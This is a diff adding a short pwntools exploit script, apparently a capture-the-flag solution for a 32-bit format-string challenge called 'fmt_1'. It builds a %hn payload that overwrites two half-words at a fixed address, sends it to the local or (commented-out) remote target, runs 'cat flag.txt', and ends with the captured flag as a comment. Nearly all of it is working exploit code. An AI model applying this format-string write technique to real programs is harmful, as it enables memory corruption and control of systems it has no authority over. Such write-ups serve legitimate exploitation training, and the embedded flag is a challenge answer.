@@ -1,0 +1,25 @@
+from pwn import *
+
+# fmt str calling convention certainly from stack (not register like x64)
+
+script = '''
+b *vuln
+b *vuln + 114
+'''
+
+p = process("./fmt_1")
+#p = remote("103.69.97.144", 6101)
+#p = gdb.debug("./fmt_1", gdbscript = script)
+
+target = 0x804b39c
+
+payload = f"%{0x6568}c%22$hn".encode()
+payload += f"%{0x6F72 - 0x6568}c%23$hn".encode()
+payload = payload.ljust(0x4 * 7, b"A")
+payload += p32(target) + p32(target + 2)
+p.sendlineafter(b"say?\n", payload)
+
+p.sendline(b"cat flag.txt")
+
+p.interactive()
+#BKSEC{R41s1ng_th3_H3rO}
